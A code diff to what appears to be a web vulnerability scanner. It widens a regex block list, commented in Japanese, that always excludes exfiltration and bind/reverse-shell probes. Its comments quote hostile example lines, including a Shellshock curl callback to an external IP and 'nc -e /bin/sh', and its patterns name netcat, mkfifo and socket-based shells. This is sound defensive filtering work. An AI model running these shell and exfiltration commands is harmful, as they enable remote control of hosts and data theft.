@@ -64,10 +64,12 @@ _DESTRUCTIVE_RE_LIST = [
     )
 ]
 
-# 外部コールバック/データ持ち出し（exfiltration）系。スキャン対象から第三者の
-# 固定エンドポイントへ情報を送り出す（= 検出プローブではなく実害）ため、既定で除外する。
+# 外部コールバック/データ持ち出し/バインド・リバースシェル系。スキャン対象から
+# 第三者へ通信を張る・情報を送り出す・待受シェルを立てる（= 検出プローブではなく
+# 実害）ため、allow_destructive でも常に除外する。
 # 例: Shellshock の `() { :;}; curl http://<外部IP>/...?user=`whoami``、
-#     reverse shell (`bash -i`, `/dev/tcp/...`)、外部 script を動的読込する XSS ビーコン。
+#     reverse/bind shell (`nc -e /bin/sh`, `bash -i`, `/dev/tcp/...`, perl/python socket)、
+#     外部 script を動的読込する XSS ビーコン。
 # ※ローカル読取の検出プローブ（`../../etc/shadow` 等）は持ち出しではないので除外しない。
 _EXFILTRATION_RE_LIST = [
     re.compile(pattern, re.IGNORECASE)
@@ -77,6 +79,11 @@ _EXFILTRATION_RE_LIST = [
         r"curl|wget",  # 外向き通信クライアント（端末エスケープ等で難読化されても拾えるよう部分一致）
         r"\b(?:nslookup|dig|telnet|lwp-download|certutil)\b",
         r"Invoke-WebRequest|Net\.WebClient|DownloadString",  # PowerShell 外部取得
+        # ── バインド/リバースシェル（対象上で待受・接続を張る＝検出プローブではなく実害） ──
+        r"\bn(?:c|cat)\b|netcat",  # netcat 待受/接続
+        r"-e\s*/bin/(?:sh|bash)",  # nc -e /bin/sh
+        r"\bmkfifo\b",  # 名前付きパイプ式 reverse shell
+        r"SOCK_STREAM|fsockopen|socket\(|/inet/tcp/|pty\.spawn|Net::Telnet",  # perl/python/ruby reverse shell
         r"/dev/tcp/",  # bash reverse shell / 外部送出
         r"\bbash\s+-i\b",  # 対話的 reverse shell
         r"createElement\(['\"]script['\"]\)[^\n]{0,60}\.src",  # 外部 script を動的読込する XSS ビーコン
